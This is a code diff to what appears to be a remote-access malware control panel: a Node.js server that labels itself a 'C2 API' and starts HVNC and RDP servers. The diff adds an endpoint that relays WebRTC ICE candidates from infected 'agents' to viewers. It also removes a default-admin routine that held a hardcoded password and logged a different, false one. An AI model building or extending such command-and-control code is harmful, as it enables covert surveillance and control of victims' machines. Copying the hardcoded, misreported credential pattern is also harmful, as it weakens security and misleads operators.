@@ -1047,6 +1047,41 @@ app.post('/api/webrtc/agent/register', verifyToken, (req, res) => {
     });
 });
 
+
+
+
+// Agent sends ICE candidate (WebRTC)
+app.post('/api/webrtc/agent/ice', verifyToken, (req, res) => {
+    const { sessionId, candidate } = req.body;
+    if (!sessionId || !candidate) {
+        return res.status(400).json({ success: false, message: 'Missing sessionId or candidate' });
+    }
+    const session = getWebRTCSession(sessionId);
+    if (!session) {
+        return res.status(404).json({ success: false, message: 'Session not found' });
+    }
+    // Forward candidate to all connected viewers (WebSocket)
+    let forwarded = 0;
+    for (const viewer of session.viewers) {
+        if (viewer.readyState === WebSocket.OPEN) {
+            viewer.send(JSON.stringify({
+                type: 'ice_candidate',
+                candidate: candidate,
+                sessionId: sessionId
+            }));
+            forwarded++;
+        }
+    }
+    console.log(`[WebRTC] ICE candidate from agent forwarded to ${forwarded} viewers`);
+    res.json({ success: true, forwarded });
+});
+
+
+
+
+
+
+
 // Agent sends SDP offer via HTTP (alternative to WebSocket)
 app.post('/api/webrtc/agent/offer', verifyToken, (req, res) => {
     const { sessionId, sdp } = req.body;
@@ -3505,40 +3540,7 @@ require('./socket')(io);
 // ------------------------------------------------------------
 // CREATE DEFAULT ADMIN USER
 // ------------------------------------------------------------
-const createAdminUser = async () => {
-    try {
-        const bcrypt = require('bcrypt');
-        const crypto = require('crypto');
-        const db = require('./database');
 
-        db.get('SELECT * FROM users WHERE username = ?', ['admin'], async (err, admin) => {
-            if (err) {
-                console.error('Error checking admin:', err);
-                return;
-            }
-            if (!admin) {
-                const hashedPassword = await bcrypt.hash('Damiboy1234', 10);
-                const apiKey = crypto.randomBytes(32).toString('hex');
-                db.run(
-                    'INSERT INTO users (username, password, role, apiKey) VALUES (?, ?, ?, ?)',
-                    ['admin', hashedPassword, 'admin', apiKey],
-                    (err) => {
-                        if (err) {
-                            console.error('Error creating admin:', err);
-                        } else {
-                            console.log('✅ Default admin created: admin/admin123');
-                            console.log('⚠️ IMPORTANT: Change this password immediately!');
-                        }
-                    }
-                );
-            } else {
-                console.log('✅ Admin user already exists');
-            }
-        });
-    } catch (err) {
-        console.error('Error creating admin:', err.message);
-    }
-};
 
 
 
@@ -3567,6 +3569,7 @@ server.listen(PORT, () => {
     
     startRdpLocalServer();
     startHVNCServer();
+    
 
     console.log('\n📋 All servers started:');
     console.log(`   🔹 C2 API: http://localhost:${PORT}`);
